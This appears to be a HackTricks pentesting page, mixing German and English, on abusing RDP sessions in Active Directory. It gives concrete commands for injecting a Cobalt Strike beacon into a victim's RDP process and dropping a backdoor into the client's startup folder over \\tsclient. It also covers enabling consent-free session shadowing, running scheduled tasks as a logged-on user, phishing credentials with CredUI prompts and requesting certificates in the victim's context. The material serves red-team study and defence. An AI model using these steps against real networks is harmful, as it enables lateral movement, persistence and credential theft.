# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Wenn die **external group** **RDP access** zu einem beliebigen **computer** in der aktuellen Domain hat, könnte ein **attacker** **compromise that computer and wait for him**.

Sobald sich dieser Benutzer per RDP angemeldet hat, kann der **attacker can pivot to that users session** und die damit verbundenen Berechtigungen in der externen Domäne missbrauchen.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Sieh dir **andere Wege, sessions mit anderen Tools zu stehlen** [**auf dieser Seite.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Wenn ein Benutzer via **RDP in eine Maschine** zugreift, in der ein **attacker** auf ihn **wartet**, kann der **attacker** einen **beacon in der RDP session des Benutzers injizieren**, und wenn der **victim beim Zugriff sein drive gemountet hat**, könnte der **attacker** darauf zugreifen.

In diesem Fall könntest du einfach **compromise** den **victims** **original computer**, indem du eine **backdoor** in den **statup folder** schreibst.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Wenn du **local admin** auf einem Host bist, auf dem das Opfer bereits eine **active RDP session** hat, könntest du in der Lage sein, **diesen Desktop anzeigen/steuern, ohne das Passwort zu stehlen oder LSASS zu dumpen**.

Das hängt von der **Remote Desktop Services shadowing**-Richtlinie ab, die gespeichert ist in:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Interessante Werte:

- `0`: Deaktiviert
- `1`: `EnableInputNotify` (Steuerung, Benutzerzustimmung erforderlich)
- `2`: `EnableInputNoNotify` (Steuerung, **keine Benutzerzustimmung**)
- `3`: `EnableNoInputNotify` (Nur-Ansicht, Benutzerzustimmung erforderlich)
- `4`: `EnableNoInputNoNotify` (Nur-Ansicht, **keine Benutzerzustimmung**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Das ist besonders nützlich, wenn ein privilegierter Benutzer, der über RDP verbunden war, einen entsperrten Desktop, eine KeePass-Sitzung, eine MMC-Konsole, eine Browsersitzung oder eine admin shell offen gelassen hat.

## Scheduled Tasks als angemeldeter Benutzer

Wenn Sie **local admin** sind und der Zielbenutzer **currently logged on** ist, kann Task Scheduler Code **as that user without their password** starten.

Das verwandelt die bestehende Anmeldesitzung des Opfers in ein execution primitive:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Hinweise:

- If the user is **not logged on**, Windows usually requires the password to create a task that runs as them.
- If the user **is logged on**, the task can reuse the existing logon context.
- This is a practical way to execute GUI actions or launch binaries inside the victim session without touching LSASS.

## CredUI Prompt Abuse From the Victim Session

Sobald Sie innerhalb des interaktiven Desktops des Opfers ausführen können (zum Beispiel via **Shadow RDP** oder **a scheduled task running as that user**), können Sie mit den CredUI-APIs ein **echtes Windows credential prompt** anzeigen und die vom Opfer eingegebenen Anmeldeinformationen abgreifen.

Relevante APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typischer Ablauf:

1. Ein Binary in der Sitzung des Opfers starten.
2. Ein domain-authentication prompt anzeigen, das zum aktuellen Domain-Branding passt.
3. Den zurückgegebenen auth buffer entpacken.
4. Die angegebenen credentials validieren und optional weiter nachfragen, bis gültige credentials eingegeben werden.

Das ist nützlich für **on-host phishing**, weil das Prompt von Standard-Windows-APIs gerendert wird anstatt von einem gefälschten HTML-Formular.

## Requesting a PFX In the Victim Context

Dasselbe **scheduled-task-as-user** primitive kann verwendet werden, um ein **certificate/PFX as the logged-on victim** anzufordern. Dieses Zertifikat kann später für **AD authentication** als dieser Benutzer verwendet werden, wodurch Passwortdiebstahl komplett vermieden wird.

Ablauf auf hoher Ebene:

1. Erlangen Sie **local admin** auf einem Host, auf dem das Opfer angemeldet ist.
2. Führen Sie die enrollment/export logic als das Opfer mittels **scheduled task** aus.
3. Das resultierende **PFX** exportieren.
4. Das PFX für PKINIT / certificate-based AD authentication verwenden.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
